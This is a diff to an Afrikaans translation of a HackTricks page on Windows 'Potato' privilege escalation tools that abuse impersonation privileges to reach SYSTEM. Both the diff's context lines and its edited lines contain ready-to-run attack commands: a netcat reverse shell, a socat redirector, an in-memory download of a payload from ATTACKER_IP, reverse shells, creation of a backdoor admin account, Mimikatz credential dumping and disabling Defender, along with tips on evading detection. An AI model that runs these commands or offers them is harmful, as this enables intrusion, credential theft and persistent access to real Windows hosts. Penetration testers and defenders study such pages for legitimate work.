@@ -3,10 +3,10 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 > [!WARNING]
-> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.
+> **JuicyPotato werk nie** op Windows Server 2019 en Windows 10 build 1809 en later nie. Nietemin, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** kan gebruik word om dieselfde voorregte te benut en `NT AUTHORITY\SYSTEM` vlak toegang te kry. Hierdie [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) bespreek die `PrintSpoofer` tool in diepte, wat gebruik kan word om impersonation-voorregte te misbruik op Windows 10 en Server 2019 gasheer waar JuicyPotato nie meer werk nie.
 
 > [!TIP]
-> 'n Moderne alternatief wat gereeld in 2024–2025 onderhou word is SigmaPotato (a fork of GodPotato) wat in-memory/.NET reflection gebruik en uitgebreide OS-ondersteuning byvoeg. Sien vinnige gebruik hieronder en die repo in References.
+> 'n Moderne alternatief wat gereeld onderhoud ontvang in 2024–2025 is SigmaPotato (‚n fork van GodPotato) wat in-memory/.NET reflection gebruik en uitgebreide OS-ondersteuning byvoeg. Sien vinnige gebruik hieronder en die repo in Verwysings.
 
 Related pages for background and manual techniques:
 
@@ -24,25 +24,25 @@ privilege-escalation-abusing-tokens.md
 
 ## Vereistes en algemene valkuils
 
-Al die volgende tegnieke berus op die misbruik van 'n bevoorregte diens wat impersonation ondersteun, vanuit 'n konteks wat een van die volgende voorregte het:
+Al die volgende tegnieke berus op die misbruik van 'n bevoorregte diens wat impersonation toelaat, vanuit 'n konteks wat een van die volgende voorregte het:
 
-- SeImpersonatePrivilege (die mees algemene) of SeAssignPrimaryTokenPrivilege
-- Hoë integriteit is nie nodig nie as die token reeds SeImpersonatePrivilege het (tipies vir baie diensrekeninge soos IIS AppPool, MSSQL, ens.)
+- SeImpersonatePrivilege (mees algemeen) of SeAssignPrimaryTokenPrivilege
+- Hoë integriteit is nie nodig as die token reeds SeImpersonatePrivilege het (tipies vir baie diensrekeninge soos IIS AppPool, MSSQL, ens.)
 
 Kontroleer voorregte vinnig:
 ```cmd
 whoami /priv | findstr /i impersonate
 ```
-Operational notes:
+Operasionele aantekeninge:
 
-- As jou shell onder 'n beperkte token loop wat nie SeImpersonatePrivilege het nie (algemeen vir Local Service/Network Service in sommige kontekste), herstel die rekening se standaard-privilege met FullPowers, en voer dan 'n Potato uit. Example: `FullPowers.exe -c "cmd /c whoami /priv" -z`
-- PrintSpoofer needs the Print Spooler service running and reachable over the local RPC endpoint (spoolss). In geharde omgewings waar Spooler na PrintNightmare gedeaktiveer is, verkies RoguePotato/GodPotato/DCOMPotato/EfsPotato.
-- RoguePotato benodig 'n OXID resolver wat bereikbaar is op TCP/135. If egress is blocked, use a redirector/port-forwarder (see example below). Older builds needed the -f flag.
+- As jou shell onder 'n beperkte token loop sonder SeImpersonatePrivilege (algemeen vir Local Service/Network Service in sommige kontekste), herstel die rekening se standaard privilègies met FullPowers, en voer dan 'n Potato uit. Voorbeeld: `FullPowers.exe -c "cmd /c whoami /priv" -z`
+- PrintSpoofer benodig die Print Spooler-diens wat loop en bereikbaar is oor die plaaslike RPC-endpoint (spoolss). In geharde omgewings waar Spooler na PrintNightmare gedeaktiveer is, verkies RoguePotato/GodPotato/DCOMPotato/EfsPotato.
+- RoguePotato vereis 'n OXID resolver wat bereikbaar is op TCP/135. If egress is blocked, use a redirector/port-forwarder (see example below). Ouer builds het die -f vlag benodig.
 - EfsPotato/SharpEfsPotato misbruik MS-EFSR; as een pipe geblokkeer is, probeer alternatiewe pipes (lsarpc, efsrpc, samr, lsass, netlogon).
-- Fout 0x6d3 tydens RpcBindingSetAuthInfo dui gewoonlik op 'n onbekende/onondersteunde RPC authentication service; probeer 'n ander pipe/transport of verseker dat die target service loop.
-- “Kitchen-sink” forks soos DeadPotato bundel ekstra payload modules (Mimikatz/SharpHound/Defender off) wat die disk raak; verwag hoër EDR detection in vergelyking met die slim originals.
+- Fout 0x6d3 tydens RpcBindingSetAuthInfo dui gewoonlik op 'n onbekende/onondersteunde RPC-authentikasiediens; probeer 'n ander pipe/transport of verseker dat die teiken-diens loop.
+- “Kitchen-sink” forks soos DeadPotato bundel ekstra payload-modules (Mimikatz/SharpHound/Defender off) wat die skyf raak; verwag hoër EDR-detectie in vergelyking met die slanke oorspronklikes.
 
-## Quick Demo
+## Vinnige Demo
 
 ### PrintSpoofer
 ```bash
@@ -60,8 +60,8 @@ NULL
 
 ```
 Aantekeninge:
-- Jy kan -i gebruik om 'n interaktiewe proses in die huidige console te begin, of -c om 'n one-liner uit te voer.
-- Vereis Spooler service. As dit gedeaktiveer is, sal dit misluk.
+- Jy kan -i gebruik om 'n interaktiewe proses in die huidige konsole te begin, of -c om 'n one-liner uit te voer.
+- Vereis die Spooler-diens. As dit afgeskakel is, sal dit misluk.
 
 ### RoguePotato
 ```bash
@@ -69,7 +69,7 @@ c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l
 # In some old versions you need to use the "-f" param
 c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
 ```
-Indien uitgaande poort 135 geblokkeer is, pivot the OXID resolver via socat op jou redirector:
+As uitgaande 135 geblokkeer is, pivot die OXID resolver via socat op jou redirector:
 ```bash
 # On attacker redirector (must listen on TCP/135 and forward to victim:9999)
 socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
@@ -79,22 +79,22 @@ RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
 ```
 ### PrintNotifyPotato
 
-PrintNotifyPotato is 'n nuwer COM-misbruik-primitive wat laat in 2022 vrygestel is en mik op die **PrintNotify** diens in plaas van Spooler/BITS. Die binêre instansieer die PrintNotify COM-bediener, vervang `IUnknown` met 'n vals een, en aktiveer dan 'n bevoorregte callback deur `CreatePointerMoniker`. Wanneer die PrintNotify-diens (lopend as **SYSTEM**) terug koppel, dupliseer die proses die teruggegewe token en spawnt die verskafde payload met volle voorregte.
+PrintNotifyPotato is 'n nuwer COM-misbruik-primitive wat laat in 2022 vrygestel is en die **PrintNotify**-diens teiken in plaas van Spooler/BITS. Die binêre instansieer die PrintNotify COM-bediener, vervang `IUnknown` met 'n vals een, en aktiveer dan 'n bevoorregte callback via `CreatePointerMoniker`. Wanneer die PrintNotify-diens (wat as **SYSTEM** loop) terugkoppel, dupliseer die proses die teruggegewe token en spawn die verskafte payload met volle voorregte.
 
 Key operational notes:
 
-* Works on Windows 10/11 and Windows Server 2012–2022 as long as the Print Workflow/PrintNotify service is installed (it is present even when the legacy Spooler is disabled post-PrintNightmare).
-* Requires the calling context to hold **SeImpersonatePrivilege** (typical for IIS APPPOOL, MSSQL, and scheduled-task service accounts).
-* Aanvaar óf 'n direkte opdrag óf 'n interaktiewe modus, sodat jy in die oorspronklike konsole kan bly. Voorbeeld:
+* Werks op Windows 10/11 en Windows Server 2012–2022 solank die Print Workflow/PrintNotify-diens geïnstalleer is (dit is teenwoordig selfs wanneer die ou Spooler gedeaktiveer is na PrintNightmare).
+* Vereis dat die oproepende konteks **SeImpersonatePrivilege** hou (tipies vir IIS APPPOOL, MSSQL en geskeduleerde-taak diensrekeninge).
+* Aanvaar óf 'n direkte opdrag óf 'n interaktiewe modus sodat jy binne die oorspronklike konsole kan bly. Voorbeeld:
 
 ```cmd
 PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
 PrintNotifyPotato.exe whoami
 ```
 
-* Omdat dit suiwer COM-gebaseer is, word geen named-pipe listeners of external redirectors vereis nie, wat dit 'n drop-in vervanging maak op hosts waar Defender RoguePotato se RPC-binding blokkeer.
+* Omdat dit suiwer COM-gebaseer is, is geen named-pipe-luisteraars of eksterne omleidings benodig nie, wat dit 'n drop-in vervanging maak op gasheerstelsels waar Defender RoguePotato’s RPC-binding blokkeer.
 
-Operateurs soos Ink Dragon voer PrintNotifyPotato onmiddellik uit nadat hulle ViewState RCE op SharePoint verkry het, om van die `w3wp.exe` worker na SYSTEM te pivot voor hulle ShadowPad installeer.
+Operateurs soos Ink Dragon aktiveer PrintNotifyPotato onmiddellik nadat hulle ViewState RCE op SharePoint verkry het om van die `w3wp.exe` worker na SYSTEM te pivot voordat hulle ShadowPad installeer.
 
 ### SharpEfsPotato
 ```bash
@@ -150,7 +150,7 @@ Aantekeninge:
 
 ![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)
 
-DCOMPotato verskaf twee variante wat mik op service DCOM-objekte wat standaard op RPC_C_IMP_LEVEL_IMPERSONATE staan. Kompileer of gebruik die voorsiene binaries en voer jou opdrag uit:
+DCOMPotato verskaf twee variante wat service DCOM-objekte teiken wat standaard op RPC_C_IMP_LEVEL_IMPERSONATE staan. Bou of gebruik die verskafde binaries en voer jou opdrag uit:
 ```cmd
 # PrinterNotify variant
 PrinterNotifyPotato.exe "cmd /c whoami"
@@ -160,7 +160,7 @@ McpManagementPotato.exe "cmd /c whoami"
 ```
 ### SigmaPotato (opgedateerde GodPotato fork)
 
-SigmaPotato voeg moderne gerieflike funksies by, soos in-memory execution via .NET reflection en 'n PowerShell reverse shell-hulpmiddel.
+SigmaPotato voeg moderne geriewe by, soos in-memory execution via .NET reflection en 'n PowerShell reverse shell helper.
 ```powershell
 # Load and execute from memory (no disk touch)
 [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
@@ -169,25 +169,25 @@ SigmaPotato voeg moderne gerieflike funksies by, soos in-memory execution via .N
 # Or ask it to spawn a PS reverse shell
 [SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
 ```
-Bykomende voordele in 2024–2025 weergawes (v1.2.x):
-- Ingeboude reverse shell-flag `--revshell` en verwydering van die 1024-teken PowerShell-beperking sodat jy lang AMSI-bypassende payloads in een slag kan stuur.
-- Reflectie-vriendelike sintaksis (`[SigmaPotato]::Main()`), plus 'n basiese AV-ontduikingstruk via `VirtualAllocExNuma()` om eenvoudige heuristieke te mislei.
-- Afsonderlike `SigmaPotatoCore.exe` gecompileer teen .NET 2.0 vir PowerShell Core-omgewings.
+Additional perks in 2024–2025 builds (v1.2.x):
+- Ingeboude reverse shell-vlag `--revshell` en verwydering van die 1024-karakter PowerShell-limiet, sodat jy lang AMSI-bypassing payloads in een keer kan stuur.
+- Reflection-vriendelike sintaksis (`[SigmaPotato]::Main()`), plus 'n rudimentêre AV-omseiltruk via `VirtualAllocExNuma()` om eenvoudige heuristieke te mislei.
+- Afsonderlike `SigmaPotatoCore.exe` gekompileer teen .NET 2.0 vir PowerShell Core-omgewings.
 
 ### DeadPotato (2024 GodPotato-herwerking met modules)
 
-DeadPotato behou die GodPotato OXID/DCOM impersonation chain, maar inkorporeer post-exploitation helpers sodat operators onmiddellik SYSTEM kan neem en persistence/collection kan uitvoer sonder bykomende gereedskap.
+DeadPotato behou die GodPotato OXID/DCOM impersonation chain, maar bou post-exploitation helpers in sodat operatoren onmiddellik SYSTEM kan neem en persistence/collection kan uitvoer sonder bykomende tooling.
 
-Gereelde modules (al vereis SeImpersonatePrivilege):
+Common modules (alle vereis SeImpersonatePrivilege):
 
-- `-cmd "<cmd>"` — voer 'n arbitrêre opdrag as SYSTEM uit.
+- `-cmd "<cmd>"` — spawn enige opdrag as SYSTEM.
 - `-rev <ip:port>` — vinnige reverse shell.
 - `-newadmin user:pass` — skep 'n plaaslike admin vir persistence.
-- `-mimi sam|lsa|all` — laat val en voer Mimikatz uit om credentials te dump (skryf na skyf, lawaaiig).
-- `-sharphound` — voer SharpHound-collection as SYSTEM uit.
-- `-defender off` — skakel Defender real-time beskerming af (baie lawaaiig).
+- `-mimi sam|lsa|all` — drop en run Mimikatz om credentials te dump (skryf na skyf, lawaaierig).
+- `-sharphound` — run SharpHound collection as SYSTEM.
+- `-defender off` — skakel Defender real-time protection af (baie lawaaierig).
 
-Voorbeeld eenreëls:
+Example one-liners:
 ```cmd
 # Blind reverse shell
 DeadPotato.exe -rev 10.10.14.7:4444
@@ -198,7 +198,7 @@ DeadPotato.exe -newadmin pwned:P@ssw0rd!
 # Run SharpHound immediately after priv-esc
 DeadPotato.exe -sharphound
 ```
-Omdat dit ekstra binaries meebring, verwag hoër AV/EDR flags; gebruik die slankere GodPotato/SigmaPotato wanneer stealth saak maak.
+Omdat dit ekstra binaries insluit, verwag hoër AV/EDR flags; gebruik die ligter GodPotato/SigmaPotato wanneer stealth saak maak.
 
 ## Verwysings
 
